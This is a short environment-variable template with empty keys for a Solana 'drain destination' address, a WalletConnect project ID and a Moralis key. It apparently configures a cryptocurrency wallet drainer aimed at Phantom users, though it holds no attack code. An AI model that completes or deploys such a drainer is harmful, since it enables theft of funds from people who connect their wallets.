# Receiver drain destination (Solana base58 pubkey)
RECEIVER_PUBKEY=
# WalletConnect project ID (optional, not wired in Phantom flow)
WC_PROJECT_ID=
# Moralis key (optional; unused client-side)
MORALIS_KEY=
